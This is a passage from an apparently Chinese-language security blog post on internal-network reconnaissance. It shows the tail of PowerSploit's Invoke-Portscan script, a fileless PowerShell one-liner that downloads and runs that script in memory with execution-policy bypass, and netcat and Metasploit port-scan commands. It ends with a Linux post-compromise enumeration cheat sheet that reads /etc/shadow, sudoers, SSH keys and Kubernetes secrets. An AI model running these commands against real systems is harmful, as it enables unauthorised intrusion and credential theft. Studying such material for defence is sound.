class="hljs-variable">$xmlStream</span>) &#123;<br>                    <span class="hljs-variable">$xmlStream</span>.flush()<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$readableStream</span>) &#123;<br>                    <span class="hljs-variable">$readableStream</span>.flush()<br>                &#125;<br><br>                <span class="hljs-variable">$saveIteration</span> ++<br>            &#125;<br><br>            <span class="hljs-variable">$enddate</span> = <span class="hljs-built_in">Get-Date</span><br>            <span class="hljs-variable">$totaltime</span> = (<span class="hljs-variable">$enddate</span> - <span class="hljs-variable">$startdate</span>).TotalSeconds<br>            <span class="hljs-variable">$endMsg</span> = <span class="hljs-string">&quot;Port scan complete at <span class="hljs-variable">$enddate</span> (<span class="hljs-variable">$totaltime</span> seconds)&quot;</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                <span class="hljs-variable">$endMsg</span> += <span class="hljs-string">&quot;, <span class="hljs-variable">$upHosts</span> hosts are up&quot;</span><br>            &#125;<br><br>            <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-comment</span> <span class="hljs-variable">$endMsg</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$grepStream</span>) &#123;<br>                <span class="hljs-variable">$grepStream</span>.Close()<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                <span class="hljs-variable">$xmlStream</span>.Close()<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$readableStream</span>) &#123;<br>                <span class="hljs-variable">$readableStream</span>.Close()<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$scannedHostList</span><br><br>        &#125;<br>        <span class="hljs-keyword">Catch</span><br>        &#123;<br>            <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>Êó†Êñá‰ª∂ËêΩÂú∞</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;<br></code></pre></td></tr></table></figure>

<ul>
<li>ÊúâÊñá‰ª∂ËêΩÂú∞</li>
</ul>
<blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;<br></code></pre></td></tr></table></figure>
</blockquote>
<h3 id="Telnet-1"><a href="#Telnet-1" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote>
<p>telnet DC 22</p>
</blockquote>
<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><blockquote>
<p>search portscan</p>
<p>use anxiliary/scanner/portscan/tcp</p>
</blockquote>
<h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><blockquote>
<p>nc.exe -vv 192.168.7.7 3389</p>
<p>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535</p>
<p>-r ÈöèÊú∫ÊåáÂÆöÊú¨Âú∞‰∏éËøúÁ´Ø‰∏ªÊú∫ÁöÑÈÄö‰ø°Á´ØÂè£<br>-z ‰ΩøÁî® 0 ËæìÂÖ•/ËæìÂá∫Ê®°ÂºèÔºåÂè™Âú®Êâ´ÊèèÈÄö‰ø°Á´ØÂè£Êó∂‰ΩøÁî®<br>-w&lt;Ë∂ÖÊó∂ÁßíÊï∞&gt; ËÆæÁΩÆÁ≠âÂæÖËøûÁ∫øÁöÑÊó∂Èó¥</p>
</blockquote>
<h3 id="fscan-1"><a href="#fscan-1" class="headerlink" title="fscan"></a>fscan</h3><h3 id="scanline-1"><a href="#scanline-1" class="headerlink" title="scanline"></a>scanline</h3><p>ËßÅ‰∏ä</p>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>linux ÊúâÂüüÊéßÁöÑÊ¶ÇÂøµÂêó ÊàëÁöÑÁúãÊ≥ïÊòØÊ≤°Êúâ ‰ΩÜÊòØÂèØ‰ª•ÈÖçÁΩÆÂØπÂ∫îÁöÑÂäüËÉΩÔºåÊàñËÄÖÂä†ÂÖ•ÂüüÔºåËøô‰∫õÊòØÂèØ‰ª•ÂÆûÁé∞ÁöÑ</p>
<p>‰∏ãÈù¢ÊòØ‰∏Ä‰∫õÂú® linux ÂÜÖÁΩëÁöÑ‰ø°ÊÅØÊî∂ÈõÜ</p>
<h2 id="‰ø°ÊÅØÊî∂ÈõÜ"><a href="#‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="‰ø°ÊÅØÊî∂ÈõÜ"></a>‰ø°ÊÅØÊî∂ÈõÜ</h2><h3 id="Ëé∑ÂèñÂÜÖÊ†∏ÔºåÊìç‰ΩúÁ≥ªÁªüÂíåËÆæÂ§á‰ø°ÊÅØ"><a href="#Ëé∑ÂèñÂÜÖÊ†∏ÔºåÊìç‰ΩúÁ≥ªÁªüÂíåËÆæÂ§á‰ø°ÊÅØ" class="headerlink" title="Ëé∑ÂèñÂÜÖÊ†∏ÔºåÊìç‰ΩúÁ≥ªÁªüÂíåËÆæÂ§á‰ø°ÊÅØ"></a>Ëé∑ÂèñÂÜÖÊ†∏ÔºåÊìç‰ΩúÁ≥ªÁªüÂíåËÆæÂ§á‰ø°ÊÅØ</h3><ul>
<li><ul>
<li><p>ÁâàÊú¨‰ø°ÊÅØ</p>
<p><code>uname -a</code> ÊâÄÊúâÁâàÊú¨ <code>uname -r</code> ÂÜÖÊ†∏ÁâàÊú¨‰ø°ÊÅØ <code>uname -n</code> Á≥ªÁªü‰∏ªÊú∫ÂêçÂ≠ó <code>uname -m</code> Linux ÂÜÖÊ†∏Êû∂ÊûÑ</p>
</li>
</ul>
</li>
<li><p>ÂÜÖÊ†∏‰ø°ÊÅØ <code>cat /proc/version</code></p>
</li>
<li><p>CPU ‰ø°ÊÅØ <code>cat /proc/cpuinfo</code></p>
</li>
<li><ul>
<li><p>ÂèëÂ∏É‰ø°ÊÅØ</p>
<p><code>cat /etc/*-release</code> <code>cat /etc/issue</code></p>
</li>
</ul>
</li>
<li><p>‰∏ªÊú∫Âêç <code>hostname</code></p>
</li>
<li><p>Êñá‰ª∂Á≥ªÁªü <code>df -a</code></p>
</li>
<li><p>ÂÜÖÊ†∏Êó•Âøó <code>dmesg</code> / <code>/var/log/dmesg</code></p>
</li>
</ul>
<h3 id="Áî®Êà∑ÂíåÁªÑ"><a href="#Áî®Êà∑ÂíåÁªÑ" class="headerlink" title="Áî®Êà∑ÂíåÁªÑ"></a>Áî®Êà∑ÂíåÁªÑ</h3><ul>
<li><p>ÂàóÂá∫Á≥ªÁªüÊâÄÊúâÁî®Êà∑ <code>cat /etc/passwd</code></p>
</li>
<li><p>ÂàóÂá∫Á≥ªÁªüÊâÄÊúâÁªÑ <code>cat /etc/group</code></p>
</li>
<li><p>ÂàóÂá∫ÊâÄÊúâÁî®Êà∑ hashÔºàrootÔºâ<code>cat /etc/shadow</code></p>
</li>
<li><ul>
<li><p>Áî®Êà∑</p>
<p>Êü•ËØ¢Áî®Êà∑ÁöÑÂü∫Êú¨‰ø°ÊÅØ <code>finger</code> ÂΩìÂâçÁôªÂΩïÁöÑÁî®Êà∑ <code>users</code> <code>who -a</code> <code>/var/log/utmp</code> Êü•ËØ¢Êó†ÂØÜÁ†ÅÁî®Êà∑ <code>grep &#39;x:0:&#39; /etc/passwd</code></p>
</li>
</ul>
</li>
<li><p>ÁõÆÂâçÁôªÂΩïÁöÑÁî®Êà∑ <code>w</code></p>
</li>
<li><p>ÁôªÂÖ•ËøáÁöÑÁî®Êà∑‰ø°ÊÅØ <code>last</code> / <code>/var/log/wtmp</code></p>
</li>
<li><p>ÊòæÁ§∫Á≥ªÁªü‰∏≠ÊâÄÊúâÁî®Êà∑ÊúÄËøë‰∏ÄÊ¨°ÁôªÂΩï‰ø°ÊÅØ <code>lastlog</code> / <code>/var/log/lastlog</code></p>
</li>
<li><p>ÁôªÂΩïÊàêÂäüÊó•Âøó <code>/var/log/secure</code></p>
</li>
<li><p>ÁôªÂΩïÂ§±Ë¥•Êó•Âøó <code>/var/log/faillog</code></p>
</li>
<li><p>Êü•ÁúãÁâπÊùÉÁî®Êà∑ <code>grep :0 /etc/passwd</code></p>
</li>
<li><p>Êü•Áúã passwd ÊúÄÂêé‰øÆÊîπÊó∂Èó¥ <code>ls -l /etc/passwd</code></p>
</li>
<li><p>Êü•ÁúãÊòØÂê¶Â≠òÂú®Á©∫Âè£‰ª§Áî®Êà∑ <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p>
</li>
<li><p>Êü•ÁúãËøúÁ®ãÁôªÂΩïÁöÑË¥¶Âè∑ <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
</li>
<li><ul>
<li><p>Êü•ÁúãÂÖ∑Êúâ sudo ÊùÉÈôêÁöÑÁî®Êà∑</p>
<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
</li>
</ul>
</li>
</ul>
<h3 id="Áî®Êà∑ÂíåÊùÉÈôê‰ø°ÊÅØ"><a href="#Áî®Êà∑ÂíåÊùÉÈôê‰ø°ÊÅØ" class="headerlink" title="Áî®Êà∑ÂíåÊùÉÈôê‰ø°ÊÅØ"></a>Áî®Êà∑ÂíåÊùÉÈôê‰ø°ÊÅØ</h3><ul>
<li>ÂΩìÂâçÁî®Êà∑ <code>whoami</code></li>
<li>ÂΩìÂâçÁî®Êà∑‰ø°ÊÅØ <code>id</code></li>
<li>ÂèØ‰ª•‰ΩøÁî® sudo ÊèêÂçáÂà∞ root ÁöÑÁî®Êà∑ÔºàrootÔºâ <code>cat /etc/sudoers</code></li>
<li>ÂàóÂá∫ÁõÆÂâçÁî®Êà∑ÂèØÊâßË°å‰∏éÊó†Ê≥ïÊâßË°åÁöÑÊåá‰ª§ <code>sudo -l</code></li>
</ul>
<h3 id="ÁéØÂ¢É‰ø°ÊÅØ"><a href="#ÁéØÂ¢É‰ø°ÊÅØ" class="headerlink" title="ÁéØÂ¢É‰ø°ÊÅØ"></a>ÁéØÂ¢É‰ø°ÊÅØ</h3><ul>
<li>ÊâìÂç∞Á≥ªÁªüÁéØÂ¢É‰ø°ÊÅØ <code>env</code></li>
<li>ÊâìÂç∞Á≥ªÁªüÁéØÂ¢É‰ø°ÊÅØ <code>set</code></li>
<li>ÁéØÂ¢ÉÂèòÈáè‰∏≠ÁöÑË∑ØÂæÑ‰ø°ÊÅØ <code>echo $PATH</code></li>
<li>ÊâìÂç∞ÂéÜÂè≤ÂëΩ‰ª§ <code>history</code> / <code>~/.bash_history</code></li>
<li>ÊòæÁ§∫ÂΩìÂâçË∑ØÂæÑ <code>pwd</code></li>
<li>ÊòæÁ§∫ÈªòËÆ§Á≥ªÁªüÈÅçÂéÜ <code>cat /etc/profile</code></li>
<li>ÊòæÁ§∫ÂèØÁî®ÁöÑ shell <code>cat /etc/shells</code></li>
</ul>
<h3 id="ËøõÁ®ã‰ø°ÊÅØ"><a href="#ËøõÁ®ã‰ø°ÊÅØ" class="headerlink" title="ËøõÁ®ã‰ø°ÊÅØ"></a>ËøõÁ®ã‰ø°ÊÅØ</h3><ul>
<li>Êü•ÁúãËøõÁ®ã‰ø°ÊÅØ <code>ps aux</code></li>
<li>ËµÑÊ∫êÂç†ÊúâÊÉÖÂÜµ <code>top -c</code></li>
<li>Êü•ÁúãËøõÁ®ãÂÖ≥ËÅîÊñá‰ª∂ <code>lsof -c $PID</code></li>
<li>ÂÆåÊï¥ÂëΩ‰ª§Ë°å‰ø°ÊÅØ <code>/proc/$PID/cmdline</code></li>
<li>ËøõÁ®ãÁöÑÂëΩ‰ª§Âêç <code>/proc/$PID/comm</code></li>
<li>ËøõÁ®ãÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩïÁöÑÁ¨¶Âè∑ÈìæÊé• <code>/proc/$PID/cwd</code></li>
<li>ËøêË°åÁ®ãÂ∫èÁöÑÁ¨¶Âè∑ÈìæÊé• <code>/proc/$PID/exe</code></li>
<li>ËøõÁ®ãÁöÑÁéØÂ¢ÉÂèòÈáè <code>/proc/$PID/environ</code></li>
<li>ËøõÁ®ãÊâìÂºÄÊñá‰ª∂ÁöÑÊÉÖÂÜµ <code>/proc/$PID/fd</code></li>
</ul>
<h3 id="ÊúçÂä°‰ø°ÊÅØ"><a href="#ÊúçÂä°‰ø°ÊÅØ" class="headerlink" title="ÊúçÂä°‰ø°ÊÅØ"></a>ÊúçÂä°‰ø°ÊÅØ</h3><ul>
<li>Áî± inetd ÁÆ°ÁêÜÁöÑÊúçÂä°ÂàóË°® <code>cat /etc/inetd.conf</code></li>
<li>Áî± xinetd ÁÆ°ÁêÜÁöÑÊúçÂä°ÂàóË°® <code>cat /etc/xinetd.conf</code></li>
<li>nfs ÊúçÂä°Âô®ÁöÑÈÖçÁΩÆ <code>cat /etc/exports</code></li>
<li>ÈÇÆ‰ª∂‰ø°ÊÅØ <code>/var/log/mailog</code></li>
<li>ssh ÈÖçÁΩÆ <code>sshd_config</code></li>
</ul>
<h3 id="ËÆ°Âàí‰ªªÂä°"><a href="#ËÆ°Âàí‰ªªÂä°" class="headerlink" title="ËÆ°Âàí‰ªªÂä°"></a>ËÆ°Âàí‰ªªÂä°</h3><p>ÊòæÁ§∫ÊåáÂÆöÁî®Êà∑ÁöÑËÆ°Âàí‰Ωú‰∏öÔºàrootÔºâ <code>crontab -l -u %user%</code></p>
<ul>
<li><ul>
<li><p>ËÆ°Âàí‰ªªÂä°</p>
<p><code>/var/spool/cron/*</code> <code>/var/spool/anacron/*</code> <code>/etc/crontab</code> <code>/etc/anacrontab</code> <code>/etc/cron.*</code> <code>/etc/anacrontab</code></p>
</li>
</ul>
</li>
<li><ul>
<li><p>ÂºÄÊú∫ÂêØÂä®È°π</p>
<p><code>/etc/rc.d/init.d/</code></p>
</li>
</ul>
</li>
</ul>
<h3 id="ÁΩëÁªú„ÄÅË∑ØÁî±ÂíåÈÄö‰ø°"><a href="#ÁΩëÁªú„ÄÅË∑ØÁî±ÂíåÈÄö‰ø°" class="headerlink" title="ÁΩëÁªú„ÄÅË∑ØÁî±ÂíåÈÄö‰ø°"></a>ÁΩëÁªú„ÄÅË∑ØÁî±ÂíåÈÄö‰ø°</h3><ul>
<li>ÂàóÂá∫ÁΩëÁªúÊé•Âè£‰ø°ÊÅØ <code>/sbin/ifconfig -a</code> / <code>ip addr show</code></li>
<li>ÂàóÂá∫ÁΩëÁªúÊé•Âè£‰ø°ÊÅØ <code>cat /etc/network/interfaces</code></li>
<li>Êü•ÁúãÁ≥ªÁªü arp Ë°® <code>arp -a</code></li>
<li>ÊâìÂç∞Ë∑ØÁî±‰ø°ÊÅØ <code>route</code> / <code>ip ro show</code></li>
<li>Êü•Áúã dns ÈÖçÁΩÆ‰ø°ÊÅØ <code>cat /etc/resolv.conf</code></li>
<li>ÊâìÂç∞Êú¨Âú∞Á´ØÂè£ÂºÄÊîæ‰ø°ÊÅØ <code>netstat -an</code></li>
<li>ÂàóÂá∫ iptable ÁöÑÈÖçÁΩÆËßÑÂàô <code>iptables -L</code></li>
<li>Êü•ÁúãÁ´ØÂè£ÊúçÂä°Êò†Â∞Ñ <code>cat /etc/services</code></li>
<li>Hostname <code>hostname -f</code></li>
<li>Êü•ÁúãËøõÁ®ãÁ´ØÂè£ÊÉÖÂÜµ <code>netstat -anltp | grep $PID</code></li>
</ul>
<h3 id="Â∑≤ÂÆâË£ÖÁ®ãÂ∫è"><a href="#Â∑≤ÂÆâË£ÖÁ®ãÂ∫è" class="headerlink" title="Â∑≤ÂÆâË£ÖÁ®ãÂ∫è"></a>Â∑≤ÂÆâË£ÖÁ®ãÂ∫è</h3><ul>
<li><code>rpm -qa --last</code> Redhat</li>
<li><code>yum list | grep installed</code> CentOS</li>
<li><code>ls -l /etc/yum.repos.d/</code></li>
<li><code>dpkg -l</code> Debian</li>
<li><code>cat /etc/apt/sources.list</code> Debian APT</li>
<li><code>pkg_info</code> xBSD</li>
<li><code>pkginfo</code> Solaris</li>
<li><code>pacman -Q</code> Arch Linux</li>
<li><code>emerge</code> Gentoo</li>
</ul>
<h3 id="Êñá‰ª∂"><a href="#Êñá‰ª∂" class="headerlink" title="Êñá‰ª∂"></a>Êñá‰ª∂</h3><ul>
<li>ÊúÄËøë‰∫îÂ§©ÁöÑÊñá‰ª∂ <code>find / -ctime +1 -ctime -5</code></li>
<li>Êñá‰ª∂Á≥ªÁªüÁªÜËäÇ <code>debugfs</code></li>
</ul>
<h3 id="ÂÖ¨ÁßÅÈí•‰ø°ÊÅØ"><a href="#ÂÖ¨ÁßÅÈí•‰ø°ÊÅØ" class="headerlink" title="ÂÖ¨ÁßÅÈí•‰ø°ÊÅØ"></a>ÂÖ¨ÁßÅÈí•‰ø°ÊÅØ</h3><ul>
<li><code>~/.ssh</code></li>
<li><code>/etc/ssh</code></li>
</ul>
<h3 id="Êó•Âøó"><a href="#Êó•Âøó" class="headerlink" title="Êó•Âøó"></a>Êó•Âøó</h3><ul>
<li><code>/var/log/boot.log</code></li>
<li><code>/var/log/cron</code></li>
<li><code>/var/log/faillog</code></li>
<li><code>/var/log/lastlog</code></li>
<li><code>/var/log/messages</code></li>
<li><code>/var/log/secure</code></li>
<li><code>/var/log/syslog</code></li>
<li><code>/var/log/syslog</code></li>
<li><code>/var/log/wtmp</code></li>
<li><code>/var/log/wtmp</code></li>
<li><code>/var/run/utmp</code></li>
</ul>
<h3 id="ËôöÊãüÁéØÂ¢ÉÊ£ÄÊµã"><a href="#ËôöÊãüÁéØÂ¢ÉÊ£ÄÊµã" class="headerlink" title="ËôöÊãüÁéØÂ¢ÉÊ£ÄÊµã"></a>ËôöÊãüÁéØÂ¢ÉÊ£ÄÊµã</h3><ul>
<li><code>lsmod | grep -i &quot;vboxsf\|vboxguest&quot;</code></li>
<li><code>lsmod | grep -i &quot;vmw_baloon\|vmxnet&quot;</code></li>
<li><code>lsmod | grep -i &quot;xen-vbd\|xen-vnif&quot;</code></li>
<li><code>lsmod | grep -i &quot;virtio_pci\|virtio_net&quot;</code></li>
<li><code>lsmod | grep -i &quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</code></li>
</ul>
<h3 id="ÂÆπÂô®ÂÜÖ‰ø°ÊÅØÊî∂ÈõÜ"><a href="#ÂÆπÂô®ÂÜÖ‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="ÂÆπÂô®ÂÜÖ‰ø°ÊÅØÊî∂ÈõÜ"></a>ÂÆπÂô®ÂÜÖ‰ø°ÊÅØÊî∂ÈõÜ</h3><ul>
<li><code>capsh --print</code></li>
<li><code>cat /proc/1/cgroup</code></li>
<li><code>env | grep KUBE</code></li>
<li><code>ls -l .dockerenv</code></li>
<li><code>ls -l /run/secrets/Kubernetes.io/</code></li>
<li><code>mount</code></li>
<li><code>ps aux</code></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91/">ÂÜÖÁΩë</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    Êú¨ÂçöÂÆ¢ÊâÄÊúâÊñáÁ´†Èô§ÁâπÂà´Â£∞ÊòéÂ§ñÔºåÂùáÈááÁî® <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 ÂçèËÆÆ</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§ÑÔºÅ
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/02/19/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93%E6%BC%AB%E6%B8%B8%E5%86%85%E7%BD%91/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ÊûÑÂª∫ÈÄöÈÅìÊº´Ê∏∏ÂÜÖÁΩë</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/02/SSTI/">
                        <span class="hidden-mobile">ssti</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"ËØ¥ÁÇπ‰ªÄ‰πà","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">ËΩΩÂÖ•Â§©Êï∞...</span> <span id="times">ËΩΩÂÖ•Êó∂ÂàÜÁßí...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ‰∏çËíúÂ≠êÁªüËÆ°PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            ÊÄªËÆøÈóÆÈáè 
            <span id="busuanzi_value_site_pv"></span>
             Ê¨°
          </span>
      
      
        <!-- ‰∏çËíúÂ≠êÁªüËÆ°UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            ÊÄªËÆøÂÆ¢Êï∞ 
            <span id="busuanzi_value_site_uv"></span>
             ‰∫∫
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°π ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<script  src="/js/boot.js" ></script>


</body>
</html>
